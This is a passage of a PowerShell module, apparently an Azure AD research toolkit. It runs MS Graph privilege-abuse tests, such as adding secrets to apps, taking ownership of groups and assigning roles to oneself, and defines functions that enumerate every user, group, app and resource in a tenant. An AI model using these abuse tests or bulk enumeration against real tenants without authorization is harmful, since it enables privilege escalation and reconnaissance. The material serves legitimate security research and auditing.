                $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }
            
            # Run all tests by default if the user did not specify an AbuseTestType
            default {
                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetSPId         $ThreadSafeSP.SPObjectId `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege          $_.displayName `
                    -TestGUID               ${using:TestGUID} `
                    -TimeOfTest             $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
                    -TestToken          $ThreadSafeTestToken.access_token `
                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
                    -HeldPrivilege      $_.displayName `
                    -TestGUID           ${using:TestGUID} `
                    -TimeOfTest         $(Get-Date)
                )
                $LocalTestResult = $using:MGTestResults
                $LocalTestResult.Add($ThreadSafeTest)

            }
        }

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetSPId         $ThreadSafeSP.SPObjectId `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
            -TestPrincipalId $ThreadSafeSP.SPObjectId `
            -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
            -TestPrincipalId        $ThreadSafeSP.SPObjectId `
            -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
            -TestToken              $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege          $_.displayName `
            -TestGUID               ${using:TestGUID} `
            -TimeOfTest             $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)

        $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
            -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken          $ThreadSafeTestToken.access_token `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
            -HeldPrivilege      $_.displayName `
            -TestGUID           ${using:TestGUID} `
            -TimeOfTest         $(Get-Date)
        )
        $LocalTestResult = $using:MGTestResults
        $LocalTestResult.Add($ThreadSafeTest)
    }
    $MGTestResults
}

Function Get-AllAzureADApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure AD application registration objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure AD application registration objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to AzureAD apps
    
    .EXAMPLE
    C:\PS> $Apps = Get-AllAzureADApps -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all apps and put them into the $Apps variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all apps
    $URI = "https://graph.microsoft.com/beta/applications/?`$count=true"
    $Results = $null
    $AppObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Applications" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalAppCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $AppObjects += $Results.value
        } else {
            $AppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($AppObjects.count/$TotalAppCount)*100))
            Write-Progress -Activity "Enumerating Applications" -Status "$($PercentComplete)% complete [$($AppObjects.count) of $($TotalAppCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $AppObjects

}

Function Get-AllAzureADServicePrincipals {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure AD service principal objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure AD service principal objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to AzureAD service principals
    
    .EXAMPLE
    C:\PS> $ServicePrincipals = Get-AllAzureADServicePrincipals -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all service principals and put them into the $ServcePrincipals variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all service principals
    $URI = "https://graph.microsoft.com/beta/servicePrincipals/?`$count=true"
    $Results = $null
    $ServicePrincipalObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Service Principals" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalServicePrincipalCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $ServicePrincipalObjects += $Results.value
        } else {
            $ServicePrincipalObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($ServicePrincipalObjects.count/$TotalServicePrincipalCount)*100))
            Write-Progress -Activity "Enumerating Service Principals" -Status "$($PercentComplete)% complete [$($ServicePrincipalObjects.count) of $($TotalServicePrincipalCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $ServicePrincipalObjects

}

Function Get-AllAzureADUsers {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure AD users objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure AD users objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to AzureAD users
    
    .EXAMPLE
    C:\PS> $Users = Get-AllAzureADUsers -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all users and put them into the $Users variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all users
    $URI = "https://graph.microsoft.com/beta/users/?`$count=true"
    $Results = $null
    $UserObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Users" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalUserCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $UserObjects += $Results.value
        } else {
            $UserObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($UserObjects.count/$TotalUserCount)*100))
            Write-Progress -Activity "Enumerating Users" -Status "$($PercentComplete)% complete [$($UserObjects.count) of $($TotalUserCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $UserObjects

}

Function Get-AllAzureADGroups {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure AD groups objects using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure AD groups objects using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the user with read access to AzureAD groups
    
    .EXAMPLE
    C:\PS> $Groups = Get-AllAzureADGroups -Token $Token -ShowProgress
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all groups and put them into the $Groups variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $False
        )]
        [Switch]
        $ShowProgress = $False
    )

    # Get all groups
    $URI = "https://graph.microsoft.com/beta/groups/?`$filter=securityEnabled eq true"
    $Results = $null
    $GroupsObjects = $null
    If ($ShowProgress) {
        Write-Progress -Activity "Enumerating Groups" -Status "Initial request..."
    }
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.'@odata.count') {
            $TotalGroupsCount = $Results.'@odata.count'
        }
        if ($Results.value) {
            $GroupsObjects += $Results.value
        } else {
            $GroupsObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
        If ($ShowProgress) {
            $PercentComplete = ([Int32](($GroupsObjects.count/$TotalGroupsCount)*100))
            Write-Progress -Activity "Enumerating Groups" -Status "$($PercentComplete)% complete [$($GroupsObjects.count) of $($TotalGroupsCount)]" -PercentComplete $PercentComplete
        }
    } until (!($uri))

    $GroupsObjects

}

Function Get-AllAzureRMSubscriptions {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM subscriptions using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM subscriptions using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list subscriptions
    
    .EXAMPLE
    C:\PS> $Subscriptions = Get-AllAzureRMSubscriptions -Token $Token
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all subscriptions and put them into the $Subscriptions variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Get all subscriptions
    $URI = "https://management.azure.com/subscriptions?api-version=2020-01-01"
    $Results = $null
    $SubscriptionObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
                ConsistencyLevel = "eventual"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $SubscriptionObjects += $Results.value
        } else {
            $SubscriptionObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $SubscriptionObjects

}

Function Get-AllAzureRMResourceGroups {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM resource groups under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM resource groups under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list resource groups

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list resource groups under
    
    .EXAMPLE
    C:\PS> $ResourceGroups = Get-AllAzureRMResourceGroups -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all resource groups under the subscription with ID starting with "839..." and put them into the $ResourceGroups variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all resource groups under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/resourcegroups?api-version=2021-04-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $ResourceGroupObjects += $Results.value
        } else {
            $ResourceGroupObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $ResourceGroupObjects

}

Function Get-AllAzureRMVirtualMachines {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM virtual machine objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM virtual machine objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list virtual machines

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list virtual machines under
    
    .EXAMPLE
    C:\PS> $VirtualMachines = Get-AllAzureRMVirtualMachines -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all virtual machines under the subscription with ID starting with "839..." and put them into the $VirtualMachines variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Virtual Machines under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $VirtualMachineObjects += $Results.value
        } else {
            $VirtualMachineObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $VirtualMachineObjects

}

Function Get-AllAzureRMLogicApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Logic Apps

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Logic Apps under
    
    .EXAMPLE
    C:\PS> $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Logic Apps under the subscription with ID starting with "839..." and put them into the $LogicApps variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Logic Apps under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Logic/workflows?api-version=2016-06-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $LogicAppObjects += $Results.value
        } else {
            $LogicAppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $LogicAppObjects

}

Function Get-AllAzureRMFunctionApps {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Function Apps

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Function Apps under
    
    .EXAMPLE
    C:\PS> $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Function Apps under the subscription with ID starting with "839..." and put them into the $FunctionApps variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Function Apps under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Web/sites?api-version=2022-03-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $FunctionAppObjects += $Results.value
        } else {
            $FunctionAppObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $FunctionAppObjects

}

Function Get-AllAzureRMAzureContainerRegistries {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Container Registries

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Container Registries under
    
    .EXAMPLE
    C:\PS> $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list all Container Registries under the subscription with ID starting with "839..." and put them into the $ContainerRegistries variable
    
    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
    )

    # Get all Container Registries under a specified subscription
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01"
    $Results = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $ContainerRegistryObjects += $Results.value
        } else {
            $ContainerRegistryObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $ContainerRegistryObjects

}

Function Get-AllAzureRMAutomationAccounts {
    <#
    .SYNOPSIS
        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
    
    .PARAMETER Token
        The AzureRM-scoped JWT for the user with the ability to list Automation Accounts

    .PARAMETER SubscriptionID
        The unique identifier of the subscription you want to list Automation Accounts under
    
    .EXAMPLE
